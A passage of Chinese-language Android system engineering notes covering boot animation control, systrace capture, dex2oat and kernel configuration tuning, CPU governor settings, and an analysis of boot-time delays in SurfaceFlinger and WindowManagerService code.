     这里表明， mStartPropertySetThread->Start() 的时候，会property_set("ctl.start", "bootanim");   开启动画。 所以，我们可以通过这个值来判断，只有当"vold.decrypt"的值为trigger_restart_framework的时候，才播放开机动画，否则不播放。那么这样的效果就是，在没有启动开机动画的时候，手机界面会一直停留在开机的第一张logo那里。
     
FDE加密过程
https://blog.csdn.net/peng_cao/article/details/70156403
```

## [性能] Android性能指标

```text
https://blog.csdn.net/xiaoru5127/article/details/84862668
```

## [性能]  [systrace] 如何快速抓取systrace(Systrace的功能用来debug performance问题)

```text
前提条件：下载好android SDK，安装Python
1，终端下，cd切换到SDK目录
2，切换到systrace目录：……../platform-tools/systrace
3,执行命令.
python systrace.py --time=10 -o performanceTrace.html sched gfx view wm
--time=10表示抓取10s的信息
–o performanceTrace.html表示输出文件名
sched gfx view wm 是TAG（python systrace.py -l 可以查看全部标签）
4,在当前路径生成的performanceTrace.html即是报告文件。右键用google浏览器打开，即可查看。

Systrace获取：
Android\Sdk\platform-tools\systrace\systrace.py

python external/chromium-trace/systrace.py --time=10 -o trace.html gfx input view webview wm am sm audio video hal  res dalvik bionic power pm ss pdx sched freq idle load binder_driver binder_lock

// tecno
python external/chromium-trace/systrace.py -b 10240 rs webview dalvik freq video binder_driver view hal database load wm sm audio power camera memreclaim app ss res idle am input sched binder_lock bionic gfx pm

atrace文件转换成chrome可以解析的html
python ~/Android/Sdk/platform-tools/systrace/systrace.py --from-file=xxxx

视频获取：
高清DV（至少>60fps）
是指点击app icon后，到app画面显示清晰完整的时间
起始点：手机快速点击app icon并离开屏幕的那一帧
结束点：app画面显示清晰完整的那一帧

https://online.mediatek.com/QuickStart/cfad1ac8-4937-49c1-8767-c6020ff2bcb0
https://developer.android.com/studio/profile/systrace/command-line
```

## [性能] 展讯性能优化学习

```text
vmstat 1 10000
/home/zq/projects/Project_common/alps/build/make/target/product/go_defaults_common.mk       PRODUCT_SYSTEM_SERVER_COMPILER_FILTER := speed-profile
改为 PRODUCT_SYSTEM_SERVER_COMPILER_FILTER := speed

[FAQ20644]  Android O、N版本修改dex2oat编译选项，减少占用ROM空间或者加快安装速度
```

## [性能] apk安装速度优化，和之前的安装速度相比提升3倍(6580-6.0)

```text
alps\frameworks\native\cmds\installd\commands.cpp

} else if (have_dex2oat_compiler_filter_flag) {
    sprintf(dex2oat_compiler_filter_arg, "--compiler-filter=%s", dex2oat_compiler_filter_flag);
}
//robin-20181128 add for optimize install speed

if (true) {
    strcpy(dex2oat_compiler_filter_arg, "--compiler-filter=interpret-only");
    have_dex2oat_compiler_filter_flag = true;
    //ALOGW("%s is in whitelist from property so set interpret-only",input_file_name);
}
// add end
// Check whether all apps should be compiled debuggable.
if (!debuggable) {


其他可以优化的方面：
1、改变APK install的模式为speed：android N采用JIT，执行阶段会透过dex2oat compile 所以log 中会看到JIT 相关thread 跑占用CPU较多状态
修改后，使APK安装阶段就进行compile，这样安装的时间会变成，部分APK 采用白名单，强制使用interpret only ，JIT 模式， 
2、调整：Aggressive LMK policy ，在背景process ，service 数量太多的情况下，调整后，可以更积极的去回收一些不重要的进程，缓解系统loading，和memory
3、调整pefservice， 延长app launch CPU，Vcore等boost 时间，
```

## [性能] 性能优化

```text
MTK平台性能优化
https://blog.csdn.net/zhangbijun1230/article/details/79514284

根据 SystemServer.java 中的代码去掉一些不用的feature和service
去掉 init.rc 中启动的一些不需要的服务
媒体播放：预留给视频解码器可以去掉，操作系统看不到
界面：硬件拉伸缓存，芯片厂商SDK配置，操作系统可见
Java堆大小全局配置，堆调小。
JVM预加载jar包，可以不加载部分不用的jar包
swap分区在内存不足的情况下，擦写频繁对flash压力大
内存裁剪：不用的驱动通过menuconfig裁掉
socket缓存调小，默认256k，多个socket消耗更多内存
去掉一些不用的监听，ContentObserver
去掉一些广播和广播监听器

1、移除或修改Window默认的Background
2、移除XML布局文件中非必需的Background
3、按需显示占位背景图片
4、控制绘制区域

第一个建议：可以使用相对布局减少层级的就使用相对布局，否则使用线性布局。Android中RelativeLayout和LinearLayout性能分析，参考：www.jianshu.com/p/8a7d059da…
第二个建议：用merge标签来合并布局，这可以减少布局层次。
第三个建议：用include标签来重用布局，抽取通用的布局可以让布局的逻辑更清晰明了，但要避免include乱用。
第四个建议：避免创建不必要的布局层级。（最容易发生的！）
第五个建议：使用惰性控件ViewStub实现布局动态加载


减少文件碎片化
应用 F2FS: “引入了全新的 F2FS 文件系统，相较于安卓原生的EXT4文件系统，能从源头上减少文件碎片化的产生”。

文件系统碎片整理:
“引入了实时自动整理文件碎片功能，大大提升了文件垃圾回收效率”，猜想应该是把整理放在空闲/待机时。

应用优先级智能判断
基于用户习惯和应用流行程度共同设定优先级。
应用分类，打开时提供不同的资源保障。
分为：计算优先型、内存优先型、存储优先型。比如相机比较耗内存，打开时就需要立即清理出足够内存。

智能调度
CPU 调度优化
猜想是做了应用级别的 CPU 资源控制，频率核心数，schedule 层面当时不一定有涉及。

内存资源调度
低优先级应用退到后台，进行内存压缩。

存储 IO 资源调度
“开辟了类似公交专用道的动态专属资源通道，以满足优先级高的应用获得稳定足够的 IO 资源”。猜想基于 IO 调度器调整进程 IO 优先级，或者通过 blkio cgroup 控制其他应用的 IO 访问。

Android 基础组件优化
数据库 read 优化，引入 Vulkan。


2、异步，利用多线程提高TPS
充分利用多核Cpu优势，利用线程解决密集型计算、IO、网络等操作。
关于多线程可参考：Java线程池
在Android应用程序中由于系统ANR的限制，将可能造成主线程超时操作放入另外的工作线程中。在工作线程中可以通过handler和主线程交互。

3、提前或延迟操作，错开时间段提高TPS
(1) 延迟操作
不在Activity、Service、BroadcastReceiver的生命周期等对响应时间敏感函数中执行耗时操作，可适当delay。
Java中延迟操作可使用ScheduledExecutorService，不推荐使用Timer.schedule;
Android中除了支持ScheduledExecutorService之外，还有一些delay操作，如
handler.postDelayed，handler.postAtTime，handler.sendMessageDelayed，View.postDelayed，AlarmManager定时等。

(2) 提前操作
对于第一次调用较耗时操作，可统一放到初始化中，将耗时提前。如得到壁纸wallpaperManager.getDrawable();

4、网络优化
更多见性能优化第四篇——移动网络优化

以下是网络优化中一些客户端和服务器端需要尽量遵守的准则：
a. 图片必须缓存，最好根据机型做图片做图片适配
b. 所有http请求必须添加httptimeout

c. 开启gzip压缩
d. api接口数据以json格式返回，而不是xml或html
e. 根据http头信息中的Cache-Control及expires域确定是否缓存请求结果。

f. 确定网络请求的connection是否keep-alive
g. 减少网络请求次数，服务器端适当做请求合并。
h. 减少重定向次数
i. api接口服务器端响应时间不超过100ms
google正在做将移动端网页速度降至1秒的项目，关注中https://developers.google.com/speed/docs/insights/mobile

一、Pinner service 配置优化
修改 /frameworks/base/core/res/res/values/config.xml 添加如下代码:

<resources xmlns:xliff="urn:oasis:names:tc:xliff:document:1.2">
    ... ...
    <!-- Default files to pin via Pinner Service -->
    <string-array translatable="false" name="config_defaultPinnerServiceFiles">
        <item>"/system/framework/arm/boot-framework.art"</item>
        <item>"/system/lib/libjavacrypto.so"</item>
        <item>"/system/lib/libhidltransport.so"</item>
        <item>"/system/framework/arm/boot-core-libart.oat"</item>
        <item>"/system/framework/arm/boot-conscrypt.oat"</item>
        <item>"/system/framework/arm/boot-core-libart.art"</item>
        <item>"/system/framework/arm/boot-ext.art"</item>
        <item>"/system/framework/arm/boot.art"</item>
        <item>"/system/framework/arm/boot-framework.art"</item>
    </string-array>
    ... ...
</resources>
二、关闭 WIFI Debugging
修改 frameworks/base/core/res/res/values/config.xml
<bool translatable="false" name="config_wifi_enable_wifi_firmware_debugging">false</bool>
<integer translatable="false" name="config_wifi_logger_ring_buffer_verbose_size_limit_kb">64</integer>

三、默认关闭BT、关闭自动旋转
修改frameworks/base/packages/SettingsProvider/res/values/defaults.xml

<?xml version="1.0" encoding="utf-8"?>
<resources>
    ... ... 
    <bool name="def_bluetooth_on">false</bool>
    <!-- Do not enable auto rotation switching. -->
    <bool name="def_accelerometer_rotation">false</bool>
    ... ...
</resources>
四、默认值使用32为程序
TARGET_ARCH 和 TARGET_ARCH_VARIANT 声明为 32 位架构，同时不要声明
TARGET_2ND_ARCH或者 TARGET_2ND_ARCH_VARIANT
同时配置 zygote为32-bit：

PRODUCT_DEFAULT_PROPERTY_OVERRIDES += ro.zygote=zygote32

五、AMS 部分的参数调整
修改代码frameworks\base\services\core\java\com\android\server\am\ActivityManagerConstants.java:
调整默认后台最大缓存进程数为 16:

private static final int DEFAULT_MAX_CACHED_PROCESSES = SystemProperties.getInt("ro....s.fw.bg_apps_limit",16);

六、屏幕输出帧率优化
首先保证NUM_FRAMEBUFFER_SURFACE_BUFFERS 值必须为 3，另外可调整 SurfaceFlinger buffer size，例如:
修改frameworks\native\services\surfaceflinger\Layer.cpp文件

将
mProducer->setMaxDequeuedBufferCount(2);
更改为
mProducer->setMaxDequeuedBufferCount(3)

七、滑动帧速率低问题优化方案
修改 Framework 下的view config 信息，具体代码路径为frameworks\base\core\java\android\view\ ViewConfiguration.java

修改方案如下：

private static final int TOUCH_SLOP = 15;//设置 slop 为 15
private static final int MINIMUM_FLING_VELOCITY = 60; //设置为 60

八、文件系统优化
对应低内存设备，建议更改userdata 分区格式为f2fs格式，减小系统开销。
修改方案如下：
device\xxx\xxxx_项目\BoardConfig.mk

TARGET_USERIMAGES_USE_F2FS := true
BOARD_USERDATAIMAGE_FILE_SYSTEM_TYPE := f2fs

九、关闭 Dm_verity 功能
对于低内存设备，Google 官方建议关闭 dm_verity 功能。
关闭方法如下:

1.修改 device\xxx\xxxx_项目\xxx_项目.mk
关闭 dm_verity 宏开关

PRODUCT_SUPPORTS_VERITY := false //设置为 false

2.kernel 部分
删除dm_verity 宏开关支持。

CONFIG_DM_VERITY=y //删除这条宏

3.system 分区参数修改
在对应 system 分区挂载的参数去掉 verify 属性，例如：

/dev/block/bootdevice/by-name/system /system ext4 ro,barrier=1 wait,verify //去掉verify属性

分区的挂载一般是在 fstab.qcom 中实现。
8909go 的项目需要单独在 kernel 对应的 dtsi 文件中对应的分区删除 verify 属性,修改后的内容如下:

system {
compatible = "android,system";
dev = "/dev/block/platform/soc/7824900.sdhci/by-name/system";
type = "ext4";
mnt_flags = "ro,barrier=1";
fsmgr_flags = "wait";
status = "ok";
};

十、优化 Touch boost 功能
对于 SmartPhone 可以开启 Touch boost，提升应用启动速度，开启方法如下:
修改kernel/msm-4.4/drivers/cpufreq/cpu-boost.c代码
相关变量如下：

/sys/module/cpu_boost/parameters/input_boost_freq 
/sys/module/cpu_boost/parameters/input_boost_ms 
/sys/module/cpu_boost/parameters/sched_boost_on_input

开启方法如下：

1. kernel 部分:
kernel config: CONFIG_CPU_BOOST=y 
defconfig file: kernel/msm-4.4/arch/arm64/configs/xxx_defconfig 

2. init.rc 中添加以下内容:
echo 0:1747200 1:1747200 2:1747200 3:1747200 4:1747200 5:1747200 6:1747200 7:1747200 > 
/sys/module/cpu_boost/parameters/input_boost_freq

#最后
如果上面几点还无法满足，可以看这本《Android应用性能优化》


优化算法，缩短生成新图时间。这需要平台去改，难度大，推动也难。直接pass。
更改refocusview刷新机制，就算动画结束前，新图没能生成，也应该提供二次刷新的机会。该改动较大，在出货阶段，万一引入新的bug，更头疼。但这应该是该问题最正确的解法。
将gallery加入高性能白名单，需要Performance组协助配置。但因为这一个问题，将其配置进白名单，有点小提大作。
动态配置CUP频率，在生成新图的过程中对CUP升频。
投机取巧，拉长动画时间。只需变更一个值，风险低。但没能从正面解决。

参考资料
https://androidperformance.com/
https://blog.csdn.net/Aerfa789/article/details/103527310
```

## [性能] Android 物联设备省电开发之cpu降频

```text
1.CPU的工作频率
单位赫兹或者兆赫兹，具体含义不解释，说实话也不太清楚，不过可以确认一点的是，CPU的工作频率越高，耗电量越大，反之亦然。我们做这个模块省电的终极目标就是降低cpu的工作频率。

2.CPU的调控模式
英文词为:Governor，解释为调速器，控制器。大家都指导android的framework是基于linux平台的，那么cpu的管理体系这块也跟linux基本上一样，其中包括cat命令，和一些文件的读写配置都是基本上差不多的。Linux在管理CPU方面，提供了如下集中调控模式，分别为：

1.performance,这个不多说，就是将cpu的工作频率调整到最大模式，让cpu充分的工作。

2.powersave,将cpu的工作频率调整到节能模式，也就是这个模式下的cpu平率是最低的。

3.ondemand,定期检查负载。当负荷超越了阈值,设置的CPU运行以最高的频率。当负载低于相同的阈值,设置的CPU运行在下一个的最低频率。导致更少的延迟比。这个理解起来可能比较困难，我用白话大概解释一下，ondemand从字面翻译是“根据需求，按照需要”，cpu在工作的时候频率会在一个最大值和最小值之间波动，当负载提高时，该调控期会自动提高cpu的频率，反之亦然。“Causes less latency than the conservative governor.”这句话的意思是，该模式跟conservative相比，会导致更少的延迟。ok，那让我们再看看conservative是如何解释的。

4.conservative，改词用来形容保守的，守旧的。该模式与ondemand的最大区别在于，conservative模式不会立刻在负载增加的情况下将cpu频率调整到最大，他会调整到比目前频率稍微大的频段去工作，保守，实在是保守！所以换来的结果是，在某种极端情况下，该模式的延迟会大于ondemand。

5.usersapce，该模式将cpu的掌控权交给了用户态，也就是交给了应用程序，应用程序可以通过配置文件的方式修改cpu的频率信息，上面3种模式好比linux已经给你定义好的4种模式，userspace好比上面4种模式无法满足我的需求，我需要自定义！(由于第四种方式需要进行大量的文件操作和配置，本文不阐述了，与省电的目标相差比较远)

ok！我们了解了这5种省电模式，那么如何查看你的android手机当前运行在哪种模式下呢?当前的cpu运行的工作频率是多少呢?最大最小频率是多少?我如何修改模式呢?

其实很简单，android的cat命令都为我们解决了这些问题，首先要强调的是，必须要获得系统的root权限，才能进行以下操作。

第一步：adb shell 进入root 命令行模式
第二步 cd /sys/devices/system/cpu/cpu0/cpufreq 进入这个目录下面
第三步 ls
第四步 你能看见很多的文件
第五步 参考下面的命令，打一遍就清楚了，不过为了给傻瓜提供更好的服务，我还是尽可能的将命令的使用和作用写的详细。

/**
  * cpu cat命令大全
  * cat [%cpuFreqPath%] /cpuinfo_cur_freq   (当前cpu频率)
  * cat [%cpuFreqPath%] /cpuinfo_max_freq  (最大cpu频率)
  * cat [%cpuFreqPath%] /cpuinfo_min_freq  (最小cpu频率)
  * cat [%cpuFreqPath%] /related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)
  * cat [%cpuFreqPath%] /scaling_available_frequencies  (cpu所有可用频率)
  * cat [%cpuFreqPath%] /scaling_available_governors  (cpu所有可用调控模式)
  * cat [%cpuFreqPath%] /scaling_available_governors  (cpu所有可用调控模式)
  * cat [%cpuFreqPath%] /scaling_cur_freq  (?????)
  * cat [%cpuFreqPath%] /scaling_driver (调控驱动)
  * cat [%cpuFreqPath%] /scaling_governor (当前使用哪种调控模式)
  * cat [%cpuFreqPath%] /scaling_max_freq (?????)
  * cat [%cpuFreqPath%] /scaling_min_freq (?????)
  * cat [%cpuFreqPath%] /scaling_setspeed (?????)
  * cat [%cpuFreqPath%] /cpuinfo_transition_latency (变频延迟)
  */

熟悉了这些语法和密令之后，我们就可以很轻松的明白，如何省电了，无非就是将cpu降频嘛，把当前的调控模式调整为powersave就可以了嘛，不错，但是还不完全正确。

首先我先讲一下如何通过命令行改写当前的调控模式，很简单，一句命令：

echo "你想使用的调控模式" /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor

但是因为手机出场适配等问题，有些机器上是没有powersave这个模式的，对了，你一定要确认当前手机是否有powersave这个模式，具体怎么看就在我上面给的命令大全里面，自己找！在没有powersave模式的情况下，我们只好通过更狠的方法修改cpu的频率，那就是直接改写cpu的频率，命令：

echo 2331000 > cpu0/cpufreq/scaling_min_freq  设置最小的工作频率，同时也可以设置最大的工作频率。
```

## [性能] Android 开机优化

```text
3.1 开机过程中CPU调频调核（kernel，系统），开启多核和调高频率，关注功耗，优化。
3.2 开机过程PMS多线程进行包扫描
3.3 PMS扫描过程中直接根据应用的Native层库目录名称确定应用的ABI，加速扫描.
3.4 添加资源预加载优化
3.5 关闭系统层和Kernel层日志
3.6 分区挂载是否重复
3.7 开机日志分解定位是否有异常耗时点，针对性进行优化

快速定位android的启动耗时
cat /proc/bootprof

开机时间相对参考机过慢，大约慢15s左右。Android 系统7.0。

问题分析
开机问题涉及的层次较多，大致有bootloader–>kernel–>Zygote–>PMS–>AMS–>Launcher
可以借助bootchart来分析，也可以直接通过log分析。不幸的是本项目机器因未知原因导致无法抓取到bootchart。
幸好在我浏览源码时发现了一个神器perfboot工具。具体在system/core/init/perfboot.py。
运行该命令需要在源码编译环境下。详细请参考源码文件，此处不做过多介绍。
使用命令：
./perfboot.py --iterations=5 --interval=30 -v --output=boot_time.tsv
获取问题机与参考机的开机数据。生成下图


上图X轴是开机启动过程中的一些重要节点。Y轴是开机时间。
详细说明下X轴上各个节点表征的含义。

boot_progress_start 系统进入用户空间，标志着kernel启动完成，本例中可以看出kernel启动耗时30s左右
boot_progress_preload_start Zygote启动
boot_progress_preload_end Zygote结束
boot_progress_system_run SystemServer ready,开始启动Android系统服务，如PMS，APMS等
boot_progress_pms_start PMS开始扫描安装的应用
boot_progress_pms_system_scan_start PMS先行扫描/system目录下的安装包
boot_progress_pms_data_scan_start PMS扫描/data目录下的安装包
boot_progress_pms_scan_end PMS扫描结束
boot_progress_pms_ready PMS就绪
boot_progress_ams_ready AMS就绪
boot_progress_enable_screen AMS启动完成后开始激活屏幕，从此以后屏幕才能响应用户的触摸，它在WindowManagerService发出退出开机动画的时间节点之前，而真正退出开机动画还会花费少许时间，具体依赖animation zip 包中的desc.txt。wm_boot_animation_done才是用户感知到的动画结束时间节点
sf_stop_bootanim SF设置service.bootanim.exit属性值为1，标志系统要结束开机动画了，可以用来跟踪开机动画结尾部分消耗的时间
wm_boot_animation_done 开机动画结束，这一步用户能直观感受到开机结束
通过上图可以直观的看到问题机在进入boot_progress_start节点之前相对参考机耗时较多。而这之前主要涉及bootloader和kernel。

bootloader 优化
这一块没有接触过，交给底层同事优化。大概说下抓取log的方式.

adb shell cat /proc/bootmsg > bootmsg.txt
adb shell cat /proc/bootprof > bootprof.txt

从log里底层同事发现是bootimg签名有问题，更详细的分析，自己对这块真心不懂，总结不出帮助性的意见。

kernel层优化
kernel的优化先check一遍config的配置，kernel中config的配置种类繁多，就算是工作几年的kernel工程师也不一定能清楚每一个config值的作用。Android提供了一个基础配置表。
可以用脚本：kernel/scripts/kconfig/merge_config.sh来生成一份config文件。具体用法戳这
拿生成的config文件和当前项目中的config做对比，同时也对比参考机的config文件。对比的时候可以用一个现成的工具kernel/scripts/diffconfig来比较。
综合比较后的结果，本地一点点调试，查找资料。最终去掉了如下config：

CONFIG_MTD_TESTS=m ----> m改为n
CONFIG_SERIAL_MSM_HSL=y ----> y改为n
CONFIG_SERIAL_MSM_HSL_CONSOLE=y ----> y改为n
CONFIG_MMC_BLOCK_TEST=m ---->注释掉
CONFIG_MMC_TEST=m ---->注释掉
CONFIG_SERIAL_MSM_HSL=y ----> y改为n
CONFIG_SERIAL_MSM_HSL_CONSOLE=y ----> y改为n
CONFIG_MSM_SMD_DEBUG=y ---->注释掉
CONFIG_CGROUP_DEBUG=y ---->注释掉
CONFIG_RELAY=y ---->注释掉
CONFIG_RMNET_DATA_DEBUG_PKT=y ---->注释掉
CONFIG_DEBUG_GPIO=y ---->注释掉
CONFIG_CORESIGHT=y ---->注释掉
CONFIG_CORESIGHT_EVENT=y ---->注释掉
CONFIG_CORESIGHT_FUSE=y ---->注释掉
CONFIG_CORESIGHT_CTI=y ---->注释掉
CONFIG_CORESIGHT_TMC=y ---->注释掉
CONFIG_CORESIGHT_TPIU=y ---->注释掉
CONFIG_CORESIGHT_FUNNEL=y ---->注释掉
CONFIG_CORESIGHT_REPLICATOR=y ---->注释掉
CONFIG_CORESIGHT_STM=y ---->注释掉
CONFIG_CORESIGHT_HWEVENT=y ---->注释掉
CONFIG_DEBUG_MEMORY_INIT=y ---->注释掉
CONFIG_DYNAMIC_DEBUG=y ---->注释掉
//以下也全部注释掉
CONFIG_SCHED_DEBUG
CONFIG_DEBUG_KMEMLEAK
CONFIG_DEBUG_KMEMLEAK_EARLY_LOG_SIZE=400
CONFIG_DEBUG_KMEMLEAK_DEFAULT_OFF
CONFIG_DEBUG_SPINLOCK
CONFIG_DEBUG_MUTEXES
CONFIG_DEBUG_ATOMIC_SLEEP
CONFIG_DEBUG_STACK_USAGE
CONFIG_DEBUG_LIST
CONFIG_FAULT_INJECTION_DEBUG_FS
CONFIG_LOCKUP_DETECTOR
CONFIG_DEBUG_PAGEALLOC
CONFIG_PAGE_POISONING
CONFIG_RMNET_DATA_DEBUG_PKT
CONFIG_MMC_PERF_PROFILING
CONFIG_DEBUG_BUS_VOTER
CONFIG_SLUB_DEBUG
CONFIG_DEBUG_BUGVERBOSE
CONFIG_ALLOC_BUFFERS_IN_4K_CHUNK
CONFIG_SERIAL_CORE
CONFIG_SERIAL_CORE_CONSOLE
CONFIG_SERIAL_MSM_HSL
CONFIG_SERIAL_MSM_HSL_CONSOLE
CONFIG_MSM_TZ_LOG
CONFIG_DYNAMIC_DEBUG

这里说下config的配置有y,n,m，m表示编译成模块，不编译进内核。不配置的话相当于n。
CONFIG_DEBUG_INFO 不能去掉， 会引起CTS不过。由于config的的各项值可能散落在kernel的不同文件中，我们可以单独编译下kernel，然后去out目录下查看obj/KERNEL_OBJ/.config 文件，这里面的配置项是完全的。

kernel关闭掉一些debug开关后。在新版本上复测结果如下：

这里提下如何看kernel的log，
开机后用命令：adb shell dmesg > dmesg.txt抓取Log
log里面搜关键字”Bootloader start count”–>LK 启动
“Bootloader end count”–>LK 结束
“Kernel MPM timestamp”–>bootloader运行完成

通过对bootloader和kernel的优化，直接减少了14s左右的开机时间，可以看到优化的效果还是比较明显的。

frameworks层优化
用命令: adb logcat -b events|grep boot我们过滤出启动阶段的主要事件。

01-01 13:38:52.139   391   391 I boot_progress_start: 15452
01-01 13:38:53.329   391   391 I boot_progress_preload_start: 16641
01-01 13:38:56.675   391   391 I boot_progress_preload_end: 19989
01-01 13:38:57.020  1729  1729 I boot_progress_system_run: 20333
01-01 13:38:57.824  1729  1729 I boot_progress_pms_start: 21137
01-01 13:38:58.865  1729  1729 I boot_progress_pms_system_scan_start: 22179
01-01 13:39:08.852  1729  1729 I boot_progress_pms_data_scan_start: 32166
01-01 13:39:08.907  1729  1729 I boot_progress_pms_scan_end: 32221
01-01 13:39:10.109  1729  1729 I boot_progress_pms_ready: 33422
01-01 13:39:12.557  1729  1729 I boot_progress_ams_ready: 35871
01-01 13:39:15.189  1729  1782 I boot_progress_enable_screen: 38503
01-01 13:39:17.973   290   321 I sf_stop_bootanim: 41287
01-01 13:39:18.887  1729  1961 I wm_boot_animation_done: 42201

结合对比图看，boot_progress_enable_screen之前问题机跟对比机各个节点耗时相差不大。在这里说明下，Android M上启动阶段到boot_progress_enable_screen就结束了，而Android N上还多了sf_stop_bootanim和wm_boot_animation_done两个事件。这也就是图-优化kernel后棕红色的线条到boot_progress_enable_screen就没有延生的原因，因为它表示的参考机，而参考机正好是Android M系统。
从log的时间戳可以看出:
boot_progress_enable_screen—>花费2s左右的时间到达sf_stop_bootanim—>花费1s多时间到达wm_boot_animation_done。多出来的两个过程总共多花接近4s的时间。
我们要重点看下这个过程发生了什么，为什么会多出来这近4s时间。

1.先看下boot_progress_enable_screen出现的位置。
它在frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java

void enableScreenAfterBoot() {
    EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_ENABLE_SCREEN,
            SystemClock.uptimeMillis());
    mWindowManager.enableScreenAfterBoot();

    synchronized (this) {
        updateEventDispatchingLocked();
    }
}
2.sf_stop_bootanim出现的位置。
它在frameworks/native/services/surfaceflinger/SurfaceFlinger_hwc1.cpp。
这里特别说明下SurfaceFlinger_hwc1.cpp是SurfaceFlinger.cpp的升级版，它支持HWC 2.0，使用的是SurfaceFlinger.cpp还是SurfaceFlinger_hwc1.cpp跟平台选择相关。

void SurfaceFlinger::bootFinished()
{
    ...
    // stop boot animation
    // formerly we would just kill the process, but we now ask it to exit so it
    // can choose where to stop the animation.
    property_set("service.bootanim.exit", "1");
    const int LOGTAG_SF_STOP_BOOTANIM = 60110;
    LOG_EVENT_LONG(LOGTAG_SF_STOP_BOOTANIM,
                   ns2ms(systemTime(SYSTEM_TIME_MONOTONIC)));
}
3.wm_boot_animation_done出现的位置。
frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java

public void performEnableScreen() {
    ...
    // Don't enable the screen until all existing windows have been drawn.
    if (!mForceDisplayEnabled && checkWaitingForWindowsLocked()) {
        return;
    }
    if (!mBootAnimationStopped) {
        // Do this one time.
        Trace.asyncTraceBegin(Trace.TRACE_TAG_WINDOW_MANAGER, "Stop bootanim", 0);
        try {
            IBinder surfaceFlinger = ServiceManager.getService("SurfaceFlinger");
            if (surfaceFlinger != null) {
                //Slog.i(TAG_WM, "******* TELLING SURFACE FLINGER WE ARE BOOTED!");
                Parcel data = Parcel.obtain();
                data.writeInterfaceToken("android.ui.ISurfaceComposer");
                surfaceFlinger.transact(IBinder.FIRST_CALL_TRANSACTION, // BOOT_FINISHED
                        data, null, 0);
                data.recycle();
            }
        } catch (RemoteException ex) {
            Slog.e(TAG_WM, "Boot completed: SurfaceFlinger is dead!");
        }
        mBootAnimationStopped = true;
    }
    if (!mForceDisplayEnabled && !checkBootAnimationCompleteLocked()) {
        if (DEBUG_BOOT) Slog.i(TAG_WM, "performEnableScreen: Waiting for anim complete");
            return;
    }
    ...
    EventLog.writeEvent(EventLogTags.WM_BOOT_ANIMATION_DONE, SystemClock.uptimeMillis());
    ...
}
找到了3个节点出现的位置，现在再来分析如何将这3个节点串联起来。
1–>2过程： AMS的enableScreenAfterBoot调用WMS的enableScreenAfterBoot方法，在WMS中的enableScreenAfterBoot会继续调用内部方法performEnableScreen，该方法内部判断开机动画如果没有停止，就调用SurfaceFlinger去停止开机动画

surfaceFlinger.transact(IBinder.FIRST_CALL_TRANSACTION, // BOOT_FINISHED
                                data, null, 0);
这里的FIRST_CALL_TRANSACTION实际上就是BOOT_FINISHED。
frameworks/native/include/gui/ISurfaceComposer.h

class BnSurfaceComposer: public BnInterface<ISurfaceComposer> {
public:
    enum {
        // Note: BOOT_FINISHED must remain this value, it is called from
        // Java by ActivityManagerService.
        BOOT_FINISHED = IBinder::FIRST_CALL_TRANSACTION,
surfaceFlinger.transact发出的调用请求会被ISurfaceComposer处理。
frameworks/native/libs/gui/ISurfaceComposer.cpp

status_t BnSurfaceComposer::onTransact(
    uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags)
{
    ...
    switch(code) {
        case BOOT_FINISHED: {
                CHECK_INTERFACE(ISurfaceComposer, data, reply);
                bootFinished();
                return NO_ERROR;
            }
    }
    ...
这里的bootFinished就是SurfaceFlinger_hwc1.cpp定义的bootFinished()方法，最终来到了第2个节点sf_stop_bootanim。
为了验证上述调用过程，我们添加上打印调用栈的log看看输出。

void SurfaceFlinger::bootFinished()
{
    const nsecs_t now = systemTime();
    const nsecs_t duration = now - mBootTime;
    ALOGI("Boot is finished (%ld ms)", long(ns2ms(duration)) );
    mBootFinished = true;
    android::CallStack stack;
    stack.update();
    stack.log("azhengye", ANDROID_LOG_DEBUG, " ");
    String8 strtemp = stack.toString("");
    ALOGD("Sunny\t%s", strtemp.string());
}
---------------------------------------------------------------------------------
04-28 12:41:15.978   308  2956 D azhengye:  #00 pc 0002b761  /system/lib/libsurfaceflinger.so
04-28 12:41:15.978   308  2956 D azhengye:  #01 pc 00045c9f  /system/lib/libgui.so
04-28 12:41:15.978   308  2956 D azhengye:  #02 pc 000310cf  /system/lib/libsurfaceflinger.so
04-28 12:41:15.978   308  2956 D azhengye:  #03 pc 000359b3  /system/lib/libbinder.so
04-28 12:41:15.979   308  2956 D azhengye:  #04 pc 0003d159  /system/lib/libbinder.so
04-28 12:41:15.979   308  2956 D azhengye:  #05 pc 0003cdb7  /system/lib/libbinder.so
04-28 12:41:15.979   308  2956 D azhengye:  #06 pc 0003d2bb  /system/lib/libbinder.so
04-28 12:41:15.979   308  2956 D azhengye:  #07 pc 0004f5f5  /system/lib/libbinder.so
04-28 12:41:15.979   308  2956 D azhengye:  #08 pc 0000e349  /system/lib/libutils.so
04-28 12:41:15.979   308  2956 D azhengye:  #09 pc 000473d3  /system/lib/libc.so
04-28 12:41:15.979   308  2956 D azhengye:  #10 pc 0001a0c9  /system/lib/libc.so
---------------------------------------------------------------------------------
SurfaceFlinger_hwc1.cpp:312   android::SurfaceFlinger::bootFinished()
ISurfaceComposer.cpp:371      android::BnSurfaceComposer::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)
SurfaceFlinger_hwc1.cpp:3103  android::SurfaceFlinger::onTransact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)
Binder.cpp:126                android::BBinder::transact(unsigned int, android::Parcel const&, android::Parcel*, unsigned int)
IPCThreadState.cpp:1111       android::IPCThreadState::executeCommand(int)
IPCThreadState.cpp:445        android::IPCThreadState::getAndExecuteCommand()
IPCThreadState.cpp:513        android::IPCThreadState::joinThreadPool(bool)
ProcessState.cpp:63 (discriminator 1)android::PoolThread::threadLoop()
Threads.cpp:751               android::Thread::_threadLoop(void*)
pthread_create.cpp:198 (discriminator 1)__pthread_start(void*)
clone.cpp:41 (discriminator 1)__start_thread
上述log也印证了之前的分析，至此1–>2的过程算是通了。在来看2–>3过程，在3节点出现之前还有一次判断：

if (!mForceDisplayEnabled && !checkBootAnimationCompleteLocked()) {
                if (DEBUG_BOOT) Slog.i(TAG_WM, "performEnableScreen: Waiting for anim complete");
                return;
}
这里系统需要去检测开机动画是否还在播放，

private boolean checkBootAnimationCompleteLocked() {
    if (SystemService.isRunning(BOOT_ANIMATION_SERVICE)) {
